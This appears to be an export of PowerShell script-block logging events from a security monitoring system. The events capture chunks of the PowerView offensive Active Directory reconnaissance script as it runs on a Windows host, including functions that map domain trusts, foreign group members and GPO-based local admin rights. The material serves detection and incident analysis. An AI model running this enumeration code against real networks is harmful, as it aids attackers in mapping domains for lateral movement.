    Convert the UAC value for 'jason' to human readable format, showing all        possible UAC values.#>        [CmdletBinding()]    param(        [Parameter(ValueFromPipeline=$True)]        $Value,        [Switch]        $ShowAll    )    begin {        # values from https://support.microsoft.com/en-us/kb/305144        $UACValues = New-Object System.Collections.Specialized.OrderedDictionary        $UACValues.Add(""SCRIPT"", 1)        $UACValues.Add(""ACCOUNTDISABLE"", 2)        $UACValues.Add(""HOMEDIR_REQUIRED"", 8)        $UACValues.Add(""LOCKOUT"", 16)        $UACValues.Add(""PASSWD_NOTREQD"", 32)        $UACValues.Add(""PASSWD_CANT_CHANGE"", 64)        $UACValues.Add(""ENCRYPTED_TEXT_PWD_ALLOWED"", 128)        $UACValues.Add(""TEMP_DUPLICATE_ACCOUNT"", 256)        $UACValues.Add(""NORMAL_ACCOUNT"", 512)        $UACValues.Add(""INTERDOMAIN_TRUST_ACCOUNT"", 2048)        $UACValues.Add(""WORKSTATION_TRUST_ACCOUNT"", 4096)        $UACValues.Add(""SERVER_TRUST_ACCOUNT"", 8192)        $UACValues.Add(""DONT_EXPIRE_PASSWORD"", 65536)        $UACValues.Add(""MNS_LOGON_ACCOUNT"", 131072)        $UACValues.Add(""SMARTCARD_REQUIRED"", 262144)        $UACValues.Add(""TRUSTED_FOR_DELEGATION"", 524288)        $UACValues.Add(""NOT_DELEGATED"", 1048576)        $UACValues.Add(""USE_DES_KEY_ONLY"", 2097152)        $UACValues.Add(""DONT_REQ_PREAUTH"", 4194304)        $UACValues.Add(""PASSWORD_EXPIRED"", 8388608)        $UACValues.Add(""TRUSTED_TO_AUTH_FOR_DELEGATION"", 16777216)        $UACValues.Add(""PARTIAL_SECRETS_ACCOUNT"", 67108864)    }    process {        $ResultUACValues = New-Object System.Collections.Specialized.OrderedDictionary        if($Value -is [Int]) {            $IntValue = $Value        }        if ($Value -is [PSCustomObject]) {            if($Value.useraccountcontrol) {                $IntValue = $Value.useraccountcontrol            }        }        if($IntValue) {            if($ShowAll) {                foreach ($UACValue in $UACValues.GetEnumerator()) {                    if( ($IntValue -band $UACValue.Value) -eq $UACValue.Value) {                        $ResultUACValues.Add($UACValue.Name, ""$($UACValue.Value)+"")                    }                    else {                        $ResultUACValues.Add($UACValue.Name, ""$($UACValue.Value)"")                    }                }            }            else {                foreach ($UACValue in $UACValues.GetEnumerator()) {                    if( ($IntValue -band $UACValue.Value) -eq $UACValue.Value) {                        $ResultUACValues.Add($UACValue.Name, ""$($UACValue.Value)"")                    }                }                            }        }        $ResultUACValues    }}function Get-Proxy {<#    .SYNOPSIS            Enumerates the proxy server and WPAD conents for the current user.    .PARAMETER ComputerName        The computername to enumerate proxy settings on, defaults to local host.    .EXAMPLE        PS C:\> Get-Proxy                 Returns the current proxy settings.#>    param(        [Parameter(ValueFromPipeline=$True)]        [ValidateNotNullOrEmpty()]        [String]        $ComputerName = $ENV:COMPUTERNAME    )    process {        try {            $Reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('CurrentUser', $ComputerName)            $RegKey = $Reg.OpenSubkey(""SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings"")            $ProxyServer = $RegKey.GetValue('ProxyServer')            $AutoConfigURL = $RegKey.GetValue('AutoConfigURL')            if($AutoConfigURL -and ($AutoConfigURL -ne """")) {                try {                    $Wpad = (New-Object Net.Webclient).DownloadString($AutoConfigURL)                }                catch {                    $Wpad = """"                }            }            el","-","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:39:32.304","3,728"
"BXV3ypsB8mE-0EyZsX_n","-",logs,"-","-","-",powershell,"-","-","-","-","Execute a Remote Command","-","C:\Users\michael.ascot\downloads\PowerView.ps1","win-3450","Creating Scriptblock text (26 of 26):         $DomainController,            [ValidateRange(1,10000)]             [Int]            $PageSize = 200        )        if(-not $Domain) {            $Domain = (Get-NetDomain).Name        }        $DomainDN = ""DC=$($Domain.Replace('.', ',DC='))""        Write-Verbose ""DomainDN: $DomainDN""        # standard group names to ignore        $ExcludeGroups = @(""Users"", ""Domain Users"", ""Guests"")        # get all the groupnames for the given domain        Get-NetGroup -GroupName $GroupName -Domain $Domain -DomainController $DomainController -FullData -PageSize $PageSize | Where-Object {$_.member} | Where-Object {            # exclude common large groups            -not ($ExcludeGroups -contains $_.samaccountname) } | ForEach-Object {                                $GroupName = $_.samAccountName                $_.member | ForEach-Object {                    # filter for foreign SIDs in the cn field for users in another domain,                    #   or if the DN doesn't end with the proper DN for the queried domain                      if (($_ -match 'CN=S-1-5-21.*-.*') -or ($DomainDN -ne ($_.substring($_.IndexOf(""DC=""))))) {                        $UserDomain = $_.subString($_.IndexOf(""DC="")) -replace 'DC=','' -replace ',','.'                        $UserName = $_.split("","")[0].split(""="")[1]                        $ForeignGroupUser = New-Object PSObject                        $ForeignGroupUser | Add-Member Noteproperty 'GroupDomain' $Domain                        $ForeignGroupUser | Add-Member Noteproperty 'GroupName' $GroupName                        $ForeignGroupUser | Add-Member Noteproperty 'UserDomain' $UserDomain                        $ForeignGroupUser | Add-Member Noteproperty 'UserName' $UserName                        $ForeignGroupUser | Add-Member Noteproperty 'UserDN' $_                        $ForeignGroupUser                    }                }        }    }    if ($Recurse) {        # get all rechable domains in the trust mesh and uniquify them        if($LDAP -or $DomainController) {            $DomainTrusts = Invoke-MapDomainTrust -LDAP -DomainController $DomainController -PageSize $PageSize | ForEach-Object { $_.SourceDomain } | Sort-Object -Unique        }        else {            $DomainTrusts = Invoke-MapDomainTrust -PageSize $PageSize | ForEach-Object { $_.SourceDomain } | Sort-Object -Unique        }        ForEach($DomainTrust in $DomainTrusts) {            # get the trust groups for each domain in the trust mesh            Write-Verbose ""Enumerating trust groups in domain $DomainTrust""            Get-ForeignGroup -GroupName $GroupName -Domain $Domain -DomainController $DomainController -PageSize $PageSize        }    }    else {        Get-ForeignGroup -GroupName $GroupName -Domain $Domain -DomainController $DomainController -PageSize $PageSize    }}function Invoke-MapDomainTrust {<#    .SYNOPSIS        This function gets all trusts for the current domain,        and tries to get all trusts for each domain it finds.    .PARAMETER LDAP        Switch. Use LDAP queries to enumerate the trusts instead of direct domain connections.        More likely to get around network segmentation, but not as accurate.    .PARAMETER DomainController        Domain controller to reflect LDAP queries through.    .PARAMETER PageSize        The PageSize to set for the LDAP searcher object.    .EXAMPLE        PS C:\> Invoke-MapDomainTrust | Export-CSV -NoTypeInformation trusts.csv                Map all reachable domain trusts and output everything to a .csv file.    .LINK        http://blog.harmj0y.net/#>    [CmdletBinding()]    param(        [Switch]        $LDAP,        [String]        $DomainController,        [ValidateRange(1,10000)]         [Int]        $PageSize = 200    )    # keep track of domains seen so we don't hit infinite recursion    $SeenDomains = @{}    # our domain status tracker    $Domains = New-Object System.Collections.Stack    # get the current domain and push it onto the stack    $CurrentDomain = (Get-NetDomain).Name    $Domains.push($CurrentDomain)    while($Domains.Count -ne 0) {        $Domain = $Domains.Pop()        # if we haven't seen this domain before        if (-not $SeenDomains.ContainsKey($Domain)) {                        Write-Verbose ""Enumerating trusts for domain '$Domain'""            # mark it as seen in our list            $Null = $SeenDomains.add($Domain, """")            try {                # get all the trusts for this domain                if($LDAP -or $DomainController) {                    $Trusts = Get-NetDomainTrust -Domain $Domain -LDAP -DomainController $DomainController -PageSize $PageSize                }                else {                    $Trusts = Get-NetDomainTrust -Domain $Domain -PageSize $PageSize                }                if($Trusts -isnot [system.array]) {                    $Trusts = @($Trusts)                }                # get any forest trusts, if they exist                $Trusts += Get-NetForestTrust -Forest $Domain                if ($Trusts) {                    # enumerate each trust found                    ForEach ($Trust in $Trusts) {                        $SourceDomain = $Trust.SourceName                        $TargetDomain = $Trust.TargetName                        $TrustType = $Trust.TrustType                        $TrustDirection = $Trust.TrustDirection                        # make sure we process the target                        $Null = $Domains.push($TargetDomain)                        # build the nicely-parsable custom output object                        $DomainTrust = New-Object PSObject                        $DomainTrust | Add-Member Noteproperty 'SourceDomain' ""$SourceDomain""                        $DomainTrust | Add-Member Noteproperty 'TargetDomain' ""$TargetDomain""                        $DomainTrust | Add-Member Noteproperty 'TrustType' ""$TrustType""                        $DomainTrust | Add-Member Noteproperty 'TrustDirection' ""$TrustDirection""                        $DomainTrust                    }                }            }            catch {                Write-Warning ""[!] Error: $_""            }        }    }}########################################################## Expose the Win32API functions and datastructures below# using PSReflect. # Warning: Once these are executed, they are baked in # and can't be changed while the script is running!#########################################################$Mod = New-InMemoryModule -ModuleName Win32# all of the Win32 API functions we need$FunctionDefinitions = @(    (func netapi32 NetShareEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),    (func netapi32 NetWkstaUserEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),    (func netapi32 NetSessionEnum ([Int]) @([String], [String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),    (func netapi32 NetApiBufferFree ([Int]) @([IntPtr])),    (func advapi32 OpenSCManagerW ([IntPtr]) @([String], [String], [Int])),    (func advapi32 CloseServiceHandle ([Int]) @([IntPtr])),    (func wtsapi32 WTSOpenServerEx ([IntPtr]) @([String])),    (func wtsapi32 WTSEnumerateSessionsEx ([Int]) @([IntPtr], [Int32].MakeByRefType(), [Int], [IntPtr].MakeByRefType(),  [Int32].MakeByRefType())),    (func wtsapi32 WTSQuerySessionInformation ([Int]) @([IntPtr], [Int], [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType())),    (func wtsapi32 WTSFreeMemoryEx ([Int]) @([Int32], [IntPtr], [Int32])),    (func wtsapi32 WTSFreeMemory ([Int]) @([IntPtr])),    (func wtsapi32 WTSCloseServer ([Int]) @([IntPtr])),    (func kernel32 GetLastError ([Int]) @()))# enum used by $WTS_SESSION_INFO_1 below$WTSConnectState = psenum $Mod WTS_CONNECTSTATE_CLASS UInt16 @{    Active       =    0    Connected    =    1    ConnectQuery =    2    Shadow       =    3    Disconnected =    4    Idle         =    5    Listen       =    6    Reset        =    7    Down         =    8    Init         =    9}# the WTSEnumerateSessionsEx result structure$WTS_SESSION_INFO_1 = struct $Mod WTS_SESSION_INFO_1 @{    ExecEnvId = field 0 UInt32    State = field 1 $WTSConnectState    SessionId = field 2 UInt32    pSessionName = field 3 String -MarshalAs @('LPWStr')    pHostName = field 4 String -MarshalAs @('LPWStr')    pUserName = field 5 String -MarshalAs @('LPWStr')    pDomainName = field 6 String -MarshalAs @('LPWStr')    pFarmName = field 7 String -MarshalAs @('LPWStr')}# the particular WTSQuerySessionInformation result structure$WTS_CLIENT_ADDRESS = struct $mod WTS_CLIENT_ADDRESS @{    AddressFamily = field 0 UInt32    Address = field 1 Byte[] -MarshalAs @('ByValArray', 20)}# the NetShareEnum result structure$SHARE_INFO_1 = struct $Mod SHARE_INFO_1 @{    shi1_netname = field 0 String -MarshalAs @('LPWStr')    shi1_type = field 1 UInt32    shi1_remark = field 2 String -MarshalAs @('LPWStr')}# the NetWkstaUserEnum result structure$WKSTA_USER_INFO_1 = struct $Mod WKSTA_USER_INFO_1 @{    wkui1_username = field 0 String -MarshalAs @('LPWStr')    wkui1_logon_domain = field 1 String -MarshalAs @('LPWStr')    wkui1_oth_domains = field 2 String -MarshalAs @('LPWStr')    wkui1_logon_server = field 3 String -MarshalAs @('LPWStr')}# the NetSessionEnum result structure$SESSION_INFO_10 = struct $Mod SESSION_INFO_10 @{    sesi10_cname = field 0 String -MarshalAs @('LPWStr')    sesi10_username = field 1 String -MarshalAs @('LPWStr')    sesi10_time = field 2 UInt32    sesi10_idle_time = field 3 UInt32}$Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'$Netapi32 = $Types['netapi32']$Advapi32 = $Types['advapi32']$Kernel32 = $Types['kernel32']$Wtsapi32 = $Types['wtsapi32']# aliases to help the PowerView 2.0 transitionSet-Alias Get-NetForestDomains Get-NetForestDomainSet-Alias Get-NetDomainControllers Get-NetDomainControllerSet-Alias Get-NetUserSPNs Get-NetUserSet-Alias Invoke-NetUserAdd Add-NetUserSet-Alias Invoke-NetGroupUserAdd Add-NetGroupUserSet-Alias Get-NetComputers Get-NetComputerSet-Alias Get-NetOUs Get-NetOUSet-Alias Get-NetGUIDOUs Get-NetOUSet-Alias Get-NetFileServers Get-NetFileServerSet-Alias Get-NetSessions Get-NetSessionSet-Alias Get-NetRDPSessions Get-NetRDPSessionSet-Alias Get-NetProcesses Get-NetProcessSet-Alias Get-UserLogonEvents Get-UserEventSet-Alias Get-UserTGTEvents Get-UserEventSet-Alias Get-UserProperties Get-UserPropertySet-Alias Get-ComputerProperties Get-ComputerPropertySet-Alias Invoke-UserHunterThreaded Invoke-UserHunterSet-Alias Invoke-ProcessHunterThreaded Invoke-ProcessHunterSet-Alias Invoke-ShareFinderThreaded Invoke-ShareFinderSet-Alias Invoke-SearchFiles Find-InterestingFileSet-Alias Invoke-UserFieldSearch Find-UserFieldSet-Alias Invoke-ComputerFieldSearch Find-ComputerFieldSet-Alias Invoke-FindLocalAdminAccess Find-LocalAdminAccessSet-Alias Invoke-FindLocalAdminAccessThreaded Find-LocalAdminAccessSet-Alias Get-NetDomainTrusts Get-NetDomainTrustSet-Alias Get-NetForestTrusts Get-NetForestTrustSet-Alias Invoke-MapDomainTrusts Invoke-MapDomainTrustSet-Alias Invoke-FindUserTrustGroups Find-ForeignUserSet-Alias Invoke-FindGroupTrustUsers Find-ForeignGroupSet-Alias Invoke-EnumerateLocalTrustGroups Invoke-EnumerateLocalAdminSet-Alias Invoke-EnumerateLocalAdmins Invoke-EnumerateLocalAdminSet-Alias Invoke-EnumerateLocalAdminsThreaded Invoke-EnumerateLocalAdminSet-Alias Invoke-FindAllUserTrustGroups Find-ForeignUserSet-Alias Find-UserTrustGroup Find-ForeignUserSet-Alias Invoke-FindAllGroupTrustUsers Find-ForeignGroupScriptBlock ID: 1a3d4436-4580-464d-b9fd-fe2a68b82ecaPath: C:\Users\michael.ascot\downloads\PowerView.ps1","-","-","-","         $DomainController,            [ValidateRange(1,10000)]             [Int]            $PageSize = 200        )        if(-not $Domain) {            $Domain = (Get-NetDomain).Name        }        $DomainDN = ""DC=$($Domain.Replace('.', ',DC='))""        Write-Verbose ""DomainDN: $DomainDN""        # standard group names to ignore        $ExcludeGroups = @(""Users"", ""Domain Users"", ""Guests"")        # get all the groupnames for the given domain        Get-NetGroup -GroupName $GroupName -Domain $Domain -DomainController $DomainController -FullData -PageSize $PageSize | Where-Object {$_.member} | Where-Object {            # exclude common large groups            -not ($ExcludeGroups -contains $_.samaccountname) } | ForEach-Object {                                $GroupName = $_.samAccountName                $_.member | ForEach-Object {                    # filter for foreign SIDs in the cn field for users in another domain,                    #   or if the DN doesn't end with the proper DN for the queried domain                      if (($_ -match 'CN=S-1-5-21.*-.*') -or ($DomainDN -ne ($_.substring($_.IndexOf(""DC=""))))) {                        $UserDomain = $_.subString($_.IndexOf(""DC="")) -replace 'DC=','' -replace ',','.'                        $UserName = $_.split("","")[0].split(""="")[1]                        $ForeignGroupUser = New-Object PSObject                        $ForeignGroupUser | Add-Member Noteproperty 'GroupDomain' $Domain                        $ForeignGroupUser | Add-Member Noteproperty 'GroupName' $GroupName                        $ForeignGroupUser | Add-Member Noteproperty 'UserDomain' $UserDomain                        $ForeignGroupUser | Add-Member Noteproperty 'UserName' $UserName                        $ForeignGroupUser | Add-Member Noteproperty 'UserDN' $_                        $ForeignGroupUser                    }                }        }    }    if ($Recurse) {        # get all rechable domains in the trust mesh and uniquify them        if($LDAP -or $DomainController) {            $DomainTrusts = Invoke-MapDomainTrust -LDAP -DomainController $DomainController -PageSize $PageSize | ForEach-Object { $_.SourceDomain } | Sort-Object -Unique        }        else {            $DomainTrusts = Invoke-MapDomainTrust -PageSize $PageSize | ForEach-Object { $_.SourceDomain } | Sort-Object -Unique        }        ForEach($DomainTrust in $DomainTrusts) {            # get the trust groups for each domain in the trust mesh            Write-Verbose ""Enumerating trust groups in domain $DomainTrust""            Get-ForeignGroup -GroupName $GroupName -Domain $Domain -DomainController $DomainController -PageSize $PageSize        }    }    else {        Get-ForeignGroup -GroupName $GroupName -Domain $Domain -DomainController $DomainController -PageSize $PageSize    }}function Invoke-MapDomainTrust {<#    .SYNOPSIS        This function gets all trusts for the current domain,        and tries to get all trusts for each domain it finds.    .PARAMETER LDAP        Switch. Use LDAP queries to enumerate the trusts instead of direct domain connections.        More likely to get around network segmentation, but not as accurate.    .PARAMETER DomainController        Domain controller to reflect LDAP queries through.    .PARAMETER PageSize        The PageSize to set for the LDAP searcher object.    .EXAMPLE        PS C:\> Invoke-MapDomainTrust | Export-CSV -NoTypeInformation trusts.csv                Map all reachable domain trusts and output everything to a .csv file.    .LINK        http://blog.harmj0y.net/#>    [CmdletBinding()]    param(        [Switch]        $LDAP,        [String]        $DomainController,        [ValidateRange(1,10000)]         [Int]        $PageSize = 200    )    # keep track of domains seen so we don't hit infinite recursion    $SeenDomains = @{}    # our domain status tracker    $Domains = New-Object System.Collections.Stack    # get the current domain and push it onto the stack    $CurrentDomain = (Get-NetDomain).Name    $Domains.push($CurrentDomain)    while($Domains.Count -ne 0) {        $Domain = $Domains.Pop()        # if we haven't seen this domain before        if (-not $SeenDomains.ContainsKey($Domain)) {                        Write-Verbose ""Enumerating trusts for domain '$Domain'""            # mark it as seen in our list            $Null = $SeenDomains.add($Domain, """")            try {                # get all the trusts for this domain                if($LDAP -or $DomainController) {                    $Trusts = Get-NetDomainTrust -Domain $Domain -LDAP -DomainController $DomainController -PageSize $PageSize                }                else {                    $Trusts = Get-NetDomainTrust -Domain $Domain -PageSize $PageSize                }                if($Trusts -isnot [system.array]) {                    $Trusts = @($Trusts)                }                # get any forest trusts, if they exist                $Trusts += Get-NetForestTrust -Forest $Domain                if ($Trusts) {                    # enumerate each trust found                    ForEach ($Trust in $Trusts) {                        $SourceDomain = $Trust.SourceName                        $TargetDomain = $Trust.TargetName                        $TrustType = $Trust.TrustType                        $TrustDirection = $Trust.TrustDirection                        # make sure we process the target                        $Null = $Domains.push($TargetDomain)                        # build the nicely-parsable custom output object                        $DomainTrust = New-Object PSObject                        $DomainTrust | Add-Member Noteproperty 'SourceDomain' ""$SourceDomain""                        $DomainTrust | Add-Member Noteproperty 'TargetDomain' ""$TargetDomain""                        $DomainTrust | Add-Member Noteproperty 'TrustType' ""$TrustType""                        $DomainTrust | Add-Member Noteproperty 'TrustDirection' ""$TrustDirection""                        $DomainTrust                    }                }            }            catch {                Write-Warning ""[!] Error: $_""            }        }    }}########################################################## Expose the Win32API functions and datastructures below# using PSReflect. # Warning: Once these are executed, they are baked in # and can't be changed while the script is running!#########################################################$Mod = New-InMemoryModule -ModuleName Win32# all of the Win32 API functions we need$FunctionDefinitions = @(    (func netapi32 NetShareEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),    (func netapi32 NetWkstaUserEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),    (func netapi32 NetSessionEnum ([Int]) @([String], [String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),    (func netapi32 NetApiBufferFree ([Int]) @([IntPtr])),    (func advapi32 OpenSCManagerW ([IntPtr]) @([String], [String], [Int])),    (func advapi32 CloseServiceHandle ([Int]) @([IntPtr])),    (func wtsapi32 WTSOpenServerEx ([IntPtr]) @([String])),    (func wtsapi32 WTSEnumerateSessionsEx ([Int]) @([IntPtr], [Int32].MakeByRefType(), [Int], [IntPtr].MakeByRefType(),  [Int32].MakeByRefType())),    (func wtsapi32 WTSQuerySessionInformation ([Int]) @([IntPtr], [Int], [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType())),    (func wtsapi32 WTSFreeMemoryEx ([Int]) @([Int32], [IntPtr], [Int32])),    (func wtsapi32 WTSFreeMemory ([Int]) @([IntPtr])),    (func wtsapi32 WTSCloseServer ([Int]) @([IntPtr])),    (func kernel32 GetLastError ([Int]) @()))# enum used by $WTS_SESSION_INFO_1 below$WTSConnectState = psenum $Mod WTS_CONNECTSTATE_CLASS UInt16 @{    Active       =    0    Connected    =    1    ConnectQuery =    2    Shadow       =    3    Disconnected =    4    Idle         =    5    Listen       =    6    Reset        =    7    Down         =    8    Init         =    9}# the WTSEnumerateSessionsEx result structure$WTS_SESSION_INFO_1 = struct $Mod WTS_SESSION_INFO_1 @{    ExecEnvId = field 0 UInt32    State = field 1 $WTSConnectState    SessionId = field 2 UInt32    pSessionName = field 3 String -MarshalAs @('LPWStr')    pHostName = field 4 String -MarshalAs @('LPWStr')    pUserName = field 5 String -MarshalAs @('LPWStr')    pDomainName = field 6 String -MarshalAs @('LPWStr')    pFarmName = field 7 String -MarshalAs @('LPWStr')}# the particular WTSQuerySessionInformation result structure$WTS_CLIENT_ADDRESS = struct $mod WTS_CLIENT_ADDRESS @{    AddressFamily = field 0 UInt32    Address = field 1 Byte[] -MarshalAs @('ByValArray', 20)}# the NetShareEnum result structure$SHARE_INFO_1 = struct $Mod SHARE_INFO_1 @{    shi1_netname = field 0 String -MarshalAs @('LPWStr')    shi1_type = field 1 UInt32    shi1_remark = field 2 String -MarshalAs @('LPWStr')}# the NetWkstaUserEnum result structure$WKSTA_USER_INFO_1 = struct $Mod WKSTA_USER_INFO_1 @{    wkui1_username = field 0 String -MarshalAs @('LPWStr')    wkui1_logon_domain = field 1 String -MarshalAs @('LPWStr')    wkui1_oth_domains = field 2 String -MarshalAs @('LPWStr')    wkui1_logon_server = field 3 String -MarshalAs @('LPWStr')}# the NetSessionEnum result structure$SESSION_INFO_10 = struct $Mod SESSION_INFO_10 @{    sesi10_cname = field 0 String -MarshalAs @('LPWStr')    sesi10_username = field 1 String -MarshalAs @('LPWStr')    sesi10_time = field 2 UInt32    sesi10_idle_time = field 3 UInt32}$Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'$Netapi32 = $Types['netapi32']$Advapi32 = $Types['advapi32']$Kernel32 = $Types['kernel32']$Wtsapi32 = $Types['wtsapi32']# aliases to help the PowerView 2.0 transitionSet-Alias Get-NetForestDomains Get-NetForestDomainSet-Alias Get-NetDomainControllers Get-NetDomainControllerSet-Alias Get-NetUserSPNs Get-NetUserSet-Alias Invoke-NetUserAdd Add-NetUserSet-Alias Invoke-NetGroupUserAdd Add-NetGroupUserSet-Alias Get-NetComputers Get-NetComputerSet-Alias Get-NetOUs Get-NetOUSet-Alias Get-NetGUIDOUs Get-NetOUSet-Alias Get-NetFileServers Get-NetFileServerSet-Alias Get-NetSessions Get-NetSessionSet-Alias Get-NetRDPSessions Get-NetRDPSessionSet-Alias Get-NetProcesses Get-NetProcessSet-Alias Get-UserLogonEvents Get-UserEventSet-Alias Get-UserTGTEvents Get-UserEventSet-Alias Get-UserProperties Get-UserPropertySet-Alias Get-ComputerProperties Get-ComputerPropertySet-Alias Invoke-UserHunterThreaded Invoke-UserHunterSet-Alias Invoke-ProcessHunterThreaded Invoke-ProcessHunterSet-Alias Invoke-ShareFinderThreaded Invoke-ShareFinderSet-Alias Invoke-SearchFiles Find-InterestingFileSet-Alias Invoke-UserFieldSearch Find-UserFieldSet-Alias Invoke-ComputerFieldSearch Find-ComputerFieldSet-Alias Invoke-FindLocalAdminAccess Find-LocalAdminAccessSet-Alias Invoke-FindLocalAdminAccessThreaded Find-LocalAdminAccessSet-Alias Get-NetDomainTrusts Get-NetDomainTrustSet-Alias Get-NetForestTrusts Get-NetForestTrustSet-Alias Invoke-MapDomainTrusts Invoke-MapDomainTrustSet-Alias Invoke-FindUserTrustGroups Find-ForeignUserSet-Alias Invoke-FindGroupTrustUsers Find-ForeignGroupSet-Alias Invoke-EnumerateLocalTrustGroups Invoke-EnumerateLocalAdminSet-Alias Invoke-EnumerateLocalAdmins Invoke-EnumerateLocalAdminSet-Alias Invoke-EnumerateLocalAdminsThreaded Invoke-EnumerateLocalAdminSet-Alias Invoke-FindAllUserTrustGroups Find-ForeignUserSet-Alias Find-UserTrustGroup Find-ForeignUserSet-Alias Invoke-FindAllGroupTrustUsers Find-ForeignGroup","-","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:39:32.304","3,728"
"AXV3ypsB8mE-0EyZjn-4","-",logs,"-","-","-",powershell,"-","-","-","-","Execute a Remote Command","-","C:\Users\michael.ascot\downloads\PowerView.ps1","win-3450","Creating Scriptblock text (1 of 1):{($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])}ScriptBlock ID: 20a6f72b-7009-456f-bd81-e5795ae93b48Path: C:\Users\michael.ascot\downloads\PowerView.ps1","-","-","-","{($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])}","-","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:39:32.304","3,728"
"BHV3ypsB8mE-0EyZon80","-",logs,"-","-","-",powershell,"-","-","-","-","Execute a Remote Command","-","C:\Users\michael.ascot\downloads\PowerView.ps1","win-3450","Creating Scriptblock text (1 of 1):{($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])}ScriptBlock ID: af4bd44c-347e-47a5-959b-4e70e125bf53Path: C:\Users\michael.ascot\downloads\PowerView.ps1","-","-","-","{($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])}","-","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:39:32.304","3,728"
"E3V3ypsB8mE-0EyZ7H96","-",logs,"-","-","-",powershell,"-","-","-","-","Execute a Remote Command","-","C:\Users\michael.ascot\downloads\PowerView.ps1","win-3450","Creating Scriptblock text (13 of 26):ct {$_} | ForEach-Object {        $GPOguid = $_.GPOName        if( -not $ProcessedGUIDs[$GPOguid] ) {            $GPOname = $_.GPODisplayName            $Filters = $_.Filters            # find any OUs that have this GUID applied            Get-NetOU -Domain $Domain -DomainController $DomainController -GUID $GPOguid -FullData -PageSize $PageSize | ForEach-Object {                if($Filters) {                    # filter for computer name/org unit if a filter is specified                    #   TODO: handle other filters?                    $OUComputers = Get-NetComputer -ADSpath $_.ADSpath -FullData -PageSize $PageSize | Where-Object {                        $_.adspath -match ($Filters.Value)                    } | ForEach-Object { $_.dnshostname }                }                else {                    $OUComputers = Get-NetComputer -ADSpath $_.ADSpath -PageSize $PageSize                }                $GPOLocation = New-Object PSObject                $GPOLocation | Add-Member Noteproperty 'ObjectName' $ObjectDistName                $GPOLocation | Add-Member Noteproperty 'GPOname' $GPOname                $GPOLocation | Add-Member Noteproperty 'GPOguid' $GPOguid                $GPOLocation | Add-Member Noteproperty 'ContainerName' $_.distinguishedname                $GPOLocation | Add-Member Noteproperty 'Computers' $OUComputers                $GPOLocation            }            # find any sites that have this GUID applied            # TODO: fix, this isn't the correct way to query computers from a site...            # Get-NetSite -GUID $GPOguid -FullData | Foreach-Object {            #     if($Filters) {            #         # filter for computer name/org unit if a filter is specified            #         #   TODO: handle other filters?            #         $SiteComptuers = Get-NetComputer -ADSpath $_.ADSpath -FullData | ? {            #             $_.adspath -match ($Filters.Value)            #         } | Foreach-Object {$_.dnshostname}            #     }            #     else {            #         $SiteComptuers = Get-NetComputer -ADSpath $_.ADSpath            #     }            #     $SiteComptuers = Get-NetComputer -ADSpath $_.ADSpath            #     $out = New-Object PSObject            #     $out | Add-Member Noteproperty 'Object' $ObjectDistName            #     $out | Add-Member Noteproperty 'GPOname' $GPOname            #     $out | Add-Member Noteproperty 'GPOguid' $GPOguid            #     $out | Add-Member Noteproperty 'ContainerName' $_.distinguishedname            #     $out | Add-Member Noteproperty 'Computers' $OUComputers            #     $out            # }            # mark off this GPO GUID so we don't process it again if there are dupes            $ProcessedGUIDs[$GPOguid] = $True        }    }}function Find-GPOComputerAdmin {<#    .SYNOPSIS        Takes a computer (or GPO) object and determines what users/groups have         administrative access over it.        Inverse of Find-GPOLocation.    .PARAMETER ComputerName        The computer to determine local administrative access to.    .PARAMETER OUName        OU name to determine who has local adminisrtative acess to computers        within it.     .PARAMETER Domain        Optional domain the computer/OU exists in, defaults to the current domain.    .PARAMETER DomainController        Domain controller to reflect LDAP queries through.    .PARAMETER Recurse        Switch. If a returned member is a group, recurse and get all members.    .PARAMETER LocalGroup        The local group to check access against.        Can be ""Administrators"" (S-1-5-32-544), ""RDP/Remote Desktop Users"" (S-1-5-32-555),        or a custom local SID.        Defaults to local 'Administrators'.    .PARAMETER UsePSDrive        Switch. Mount any found policy files with temporary PSDrives.    .PARAMETER PageSize        The PageSize to set for the LDAP searcher object.    .EXAMPLE        PS C:\> Find-GPOComputerAdmin -ComputerName WINDOWS3.dev.testlab.local                Finds users who have local admin rights over WINDOWS3 through GPO correlation.    .EXAMPLE        PS C:\> Find-GPOComputerAdmin -ComputerName WINDOWS3.dev.testlab.local -LocalGroup RDP                Finds users who have RDP rights over WINDOWS3 through GPO correlation.#>    [CmdletBinding()]    Param (        [Parameter(ValueFromPipeline=$True)]        [String]        $ComputerName,        [String]        $OUName,        [String]        $Domain,        [String]        $DomainController,        [Switch]        $Recurse,        [String]        $LocalGroup = 'Administrators',        [Switch]        $UsePSDrive,        [ValidateRange(1,10000)]         [Int]        $PageSize = 200    )    process {            if(!$ComputerName -and !$OUName) {            Throw ""-ComputerName or -OUName must be provided""        }        if($ComputerName) {            $Computers = Get-NetComputer -ComputerName $ComputerName -Domain 